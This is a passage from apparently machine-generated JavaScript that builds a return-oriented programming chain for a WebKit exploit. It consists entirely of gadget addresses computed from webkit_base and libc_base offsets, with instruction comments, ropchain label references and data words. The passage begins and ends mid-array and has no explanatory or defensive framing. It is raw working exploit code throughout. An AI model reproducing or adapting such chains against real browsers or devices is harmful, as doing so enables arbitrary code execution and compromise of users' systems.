webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+107192, //L1067
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1067:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+107304, //L1071
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1069:
db([20, 0]); // 0x14
set_gadget(libc_base+772328,); //pop rcx
//L1070:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1071:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+107384, //L1072
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+107400, //L1073
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1072:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1073:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+107488, //L1074
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1074:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+107544, //L1076
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1076:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+107616, //L1078
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1078:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+107672, //L1080
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1080:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1082:
libc_base+713278, //pop rsi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+107824, //L1084
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1083:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1084:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+107928, //L1087
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+107912, //L1086
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1086:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+108072, //L1091
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+108040, //L1089
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+108056, //L1090
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1089:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1090:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1091:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+108144, //L1092
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1092:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+108200, //L1094
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1094:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+108312, //L1098
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1096:
db([21, 0]); // 0x15
set_gadget(libc_base+772328,); //pop rcx
//L1097:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1098:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+108392, //L1099
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+108408, //L1100
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1099:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1100:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+108496, //L1101
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+108552, //L1103
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1103:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+108624, //L1105
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1105:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+108680, //L1107
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1107:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+108784, //L1110
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1109:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L1110:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+108888, //L1113
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+108872, //L1112
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1112:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1113:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+109032, //L1117
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+109000, //L1115
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+109016, //L1116
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1115:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1116:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1117:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+109104, //L1118
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1118:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+109160, //L1120
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1120:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+109272, //L1124
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1122:
db([3, 0]); // 0x3
set_gadget(libc_base+772328,); //pop rcx
//L1123:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1124:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+109352, //L1125
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+109368, //L1126
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1125:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+109456, //L1127
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1127:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+109512, //L1129
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1129:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+109632, //L1132
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1131:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1132:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+109736, //L1135
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+109720, //L1134
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1134:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1135:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+109880, //L1139
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+109848, //L1137
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+109864, //L1138
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1137:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1138:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1139:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+109952, //L1140
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1140:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+110008, //L1142
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1142:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+110120, //L1146
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1144:
db([22, 0]); // 0x16
set_gadget(libc_base+772328,); //pop rcx
//L1145:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1146:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+110200, //L1147
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+110216, //L1148
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1147:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1148:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+110304, //L1149
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1149:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+110360, //L1151
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1151:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+110432, //L1153
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1153:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+110488, //L1155
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1155:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1157:
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+110640, //L1159
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1158:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1159:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+110744, //L1162
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+110728, //L1161
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1161:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1162:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+110888, //L1166
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+110856, //L1164
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+110872, //L1165
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1164:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1165:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1166:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+110960, //L1167
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1167:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+111016, //L1169
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1169:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+111128, //L1173
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1171:
db([23, 0]); // 0x17
set_gadget(libc_base+772328,); //pop rcx
//L1172:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1173:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+111208, //L1174
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+111224, //L1175
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1174:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1175:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+111312, //L1176
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1176:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+111368, //L1178
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1178:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+111440, //L1180
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1180:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+111496, //L1182
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1182:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1184:
libc_base+165442, //pop rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+111648, //L1186
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1185:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1186:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+111752, //L1189
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+111736, //L1188
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1188:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1189:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+111896, //L1193
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+111864, //L1191
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+111880, //L1192
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1191:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1192:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1193:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+111968, //L1194
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1194:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+112024, //L1196
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1196:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+112136, //L1200
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1198:
db([24, 0]); // 0x18
set_gadget(libc_base+772328,); //pop rcx
//L1199:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1200:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+112216, //L1201
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+112232, //L1202
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1201:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1202:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+112320, //L1203
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1203:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+112376, //L1205
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1205:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+112448, //L1207
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1207:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+112504, //L1209
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1209:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+112608, //L1212
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1211:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L1212:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+112712, //L1215
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+112696, //L1214
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1214:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1215:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+112856, //L1219
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+112824, //L1217
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+112840, //L1218
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1217:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1218:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1219:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+112928, //L1220
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1220:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
